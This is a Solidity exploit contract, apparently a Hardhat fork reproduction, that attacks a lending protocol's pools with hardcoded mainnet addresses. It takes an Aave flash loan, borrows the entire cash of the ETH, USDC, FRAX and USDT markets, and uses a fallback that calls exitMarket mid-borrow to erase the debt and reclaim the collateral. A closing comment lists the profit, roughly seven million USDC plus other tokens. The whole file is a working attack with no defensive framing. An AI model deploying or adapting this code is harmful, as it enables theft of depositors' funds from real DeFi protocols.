// SPDX-License-Identifier: agpl-3.0
pragma solidity >=0.6.12;

import { FlashLoanReceiverBase } from "./FlashLoanReceiverBase.sol";
import { ILendingPool, ILendingPoolAddressesProvider, IWETH, Cerc20, IERC20, IERC20_USDT, ComptrollerInterface } from "./Interfaces.sol";
import { SafeMath } from "./Libraries.sol";
import "hardhat/console.sol";

// Side attack contract
contract AttackChild {

    address unitroller = 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F;
    address marketToExit = address(0);

    function enterMarket(address ctoken) external {
        address[] memory ctokens = new address[](1);
        ctokens[0] = ctoken;
        ComptrollerInterface(unitroller).enterMarkets(ctokens);
        marketToExit = ctoken;
    }

    function deposit(address ctoken, uint256 amount) external {
        address token = Cerc20(ctoken).underlying();
        IERC20(token).approve(ctoken, uint256(-1));
        Cerc20(ctoken).mint(amount);
    }

    function borrow(address ctoken, uint256 amount) external {
        Cerc20(ctoken).borrow(amount);
    }

    // Redeem and send `ctoken` underlying tokens and this contract's ETH to `tosend` address
    function redeemAll(address ctoken, uint256 amount, address toSend) external {
        Cerc20(ctoken).redeemUnderlying(amount);        
        address token = Cerc20(ctoken).underlying();
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(toSend, balance);
        balance = address(this).balance;
        if (balance > 0)
            toSend.call{value:balance}("");
    }

    fallback () external payable {
        // Exit the market, thus erasing the debt on the collateral
        if (marketToExit != address(0))
            ComptrollerInterface(unitroller).exitMarket(marketToExit);
    }
}

// Main attack contract
contract AttackInit is FlashLoanReceiverBase {
    using SafeMath for uint256;

    address owner;
    address aaveV2 = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;
    address unitroller = 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F;
    address fusdc127 = 0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47;
    address feth127 = 0x26267e41CeCa7C8E0f143554Af707336f27Fa051;
    address ffrax127 = 0x8922C1147E141C055fdDfc0ED5a119f3378c8ef8;
    address fusdt127 = 0xe097783483D1b7527152eF8B150B99B9B2700c8d;

    address wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address usdcAddr = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address usdtAddr = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address fraxAddr = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    uint256 wethToBorrow = 50 * 1e21;  // Used to exploit other token pools
    uint256 usdcToBorrow = 150 * 1e12;  // Used to exploit the ETH pool

    constructor()
        FlashLoanReceiverBase(ILendingPoolAddressesProvider(aaveV2))
        public
    {
        owner = msg.sender;
    }

    fallback () external payable {
        console.log("Fallback: Curr ETH balance is ", address(this).balance);
    }

    function exploit() public {
        myFlashLoanCall();  // Exploit w/ Flash Loan as the initial capital
    }

    // Deposit USDC, borrow ETH, then get back all of the deposited USDC + keep borrowed ETH
    function exploitETHpool() internal {
        address ctoken = fusdc127;
        address token = usdcAddr;
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));

        AttackChild attackChild = new AttackChild();
        IERC20(token).transfer(address(attackChild), tokenBalance);
        attackChild.enterMarket(ctoken);
        attackChild.deposit(ctoken, tokenBalance);  // Deposit USDC
        uint256 ethBalance = Cerc20(feth127).getCash();
        (,uint256 liq,) = ComptrollerInterface(unitroller).getAccountLiquidity(address(attackChild));
        if (liq < ethBalance)
            ethBalance = liq;
        // Exploit happens here, in the `borrow` function
        attackChild.borrow(feth127, ethBalance);  // Borrow ETH
        attackChild.redeemAll(ctoken, tokenBalance, address(this));  // Get back the full amount of collateral USDC
    }

    function exploitLogic() internal {

        exploitETHpool();  // Get deposited ETH from feth127 pool

        IWETH(wethAddr).withdraw(wethToBorrow);  // Convert WETH from FL to ETH

        // Deposit ETH as collateral
        Cerc20(feth127).mint{value: address(this).balance}();
        address[] memory ctokens = new address[](1);
        ctokens[0] = feth127;
        ComptrollerInterface(unitroller).enterMarkets(ctokens);

        // Borrow (all of the victim's balance of) USDC, FRAX, USDT
        uint256 balance = Cerc20(fusdc127).getCash();
        Cerc20(fusdc127).borrow(balance);
        balance = Cerc20(ffrax127).getCash();
        Cerc20(ffrax127).borrow(balance);
        balance = Cerc20(fusdt127).getCash();
        Cerc20(fusdt127).borrow(balance);

        // Get back the deposited collateral ETH 
        // By using the exploit we get away with the borrowed assets while getting back our collateral ETH
        exploitETHpool();

        balance = Cerc20(feth127).getCash();
        if (balance > 0)  // Get leftovers of the deposited collateral ETH
            Cerc20(feth127).redeemUnderlying(balance);

        // Convert ETH to WETH
        IWETH(wethAddr).deposit{value : address(this).balance}();
    }


    // Called after the FL is received
    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata) external override returns (bool)
    {
        exploitLogic();  // The attack is executed here

        for (uint i = 0; i < assets.length; i++) {  // Return the borrowed assets to AAVE
            uint amountOwing = amounts[i].add(premiums[i]);
            IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
        }
        return true;
    }

    // Request the FL
    function myFlashLoanCall() internal {
        address receiverAddress = address(this);

        address[] memory assets = new address[](2);
        assets[0] = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC
        assets[1] = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = usdcToBorrow;  // USDC
        amounts[1] = wethToBorrow;  // WETH

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0; modes[1] = 0;

        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;
        LENDING_POOL.flashLoan(receiverAddress,assets,amounts,modes,onBehalfOf,params,referralCode);
    }

    // Check the balance of a given address in the tokens targeted by the exploit
    function checkBalance(address addressToCheck) public view {
        uint balance;
        console.log("----ATK BALANCES of %s ----", addressToCheck);
        balance = IERC20(usdtAddr).balanceOf(addressToCheck);
        console.log("USDT: ", balance);        
        balance = IERC20(usdcAddr).balanceOf(addressToCheck);
        console.log("USDC: ", balance);
        balance = IERC20(fraxAddr).balanceOf(addressToCheck);
        console.log("FRAX: ", balance);
        balance = IERC20(wethAddr).balanceOf(addressToCheck);
        console.log("WETH: ", balance);
        balance = address(this).balance;
        console.log("ETH: ", balance);
        console.log("----END BALANCES of %s ----", addressToCheck);
    }
}

// PROFIT:
// -------
// USDT:  132.959,900829
// USDC:  7.009.266,341363
// FRAX:  776.937,058467725803492533
// WETH:  1.932,579153781557429247
// ETH:  0
